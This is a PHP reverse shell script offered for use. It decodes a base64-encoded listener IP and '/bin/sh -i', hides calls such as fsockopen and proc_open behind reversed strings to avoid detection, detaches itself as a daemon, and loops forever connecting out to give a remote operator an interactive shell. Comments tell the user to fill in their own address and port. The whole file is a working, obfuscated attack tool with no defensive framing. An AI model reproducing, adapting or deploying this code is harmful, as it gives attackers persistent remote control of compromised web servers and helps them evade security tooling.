<?php
@set_time_limit(0);
@error_reporting(0);
@ini_set('display_errors', 0);

// Base64-encoded sensitive values
$ip_b64     = 'MTkyLjE2OC4xLjU=';        // change this to your base64 encoded IP Address
$port       = 222;                       // change this to your listener port
$shell_b64  = 'L2Jpbi9zaCAtaQ==';        // /bin/sh -i

// Decode and clean values
$ip    = trim(base64_decode($ip_b64));
$shell = base64_decode($shell_b64);

// Obfuscated function names
$f1 = strrev('nepokcosf');               // fsockopen
$f2 = strrev('nepo_corp');              // proc_open
$f3 = strrev('gnikcolb_tes_maerts');     // stream_set_blocking
$f4 = strrev('tceles_maerts');           // stream_select

// Optional daemonization
$pcntl = function_exists(strrev('krof_ltncp'));  // pcntl_fork
$posix = function_exists(strrev('distes_xisop')); // posix_setsid

if ($pcntl && $posix) {
    $pid = pcntl_fork();
    if ($pid == -1 || $pid > 0) exit();
    if (posix_setsid() == -1) exit();
    $pid2 = pcntl_fork();
    if ($pid2 > 0) exit();
    chdir('/');
    umask(0);
}

// Connection loop
while (true) {
    $sock = @$f1($ip, $port);
    if (!$sock) {
        sleep(5);
        continue;
    }

    $desc = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];

    $proc = @$f2($shell, $desc, $pipes);
    if (!is_resource($proc)) {
        @fclose($sock);
        sleep(5);
        continue;
    }

    @$f3($pipes[0], false);
    @$f3($pipes[1], false);
    @$f3($pipes[2], false);
    @$f3($sock, false);

    while (true) {
        if (@feof($sock) || @feof($pipes[1])) break;

        $read = [$sock, $pipes[1], $pipes[2]];
        $write = $except = null;

        if (@$f4($read, $write, $except, null) === false) break;

        if (in_array($sock, $read)) {
            $input = @fread($sock, 1400);
            if ($input === false) break;
            @fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read)) {
            $output = @fread($pipes[1], 1400);
            if ($output === false) break;
            @fwrite($sock, $output);
        }
        if (in_array($pipes[2], $read)) {
            $error = @fread($pipes[2], 1400);
            if ($error === false) break;
            @fwrite($sock, $error);
        }
    }

    @fclose($sock);
    @fclose($pipes[0]);
    @fclose($pipes[1]);
    @fclose($pipes[2]);
    @proc_close($proc);

    sleep(5);
}
?>
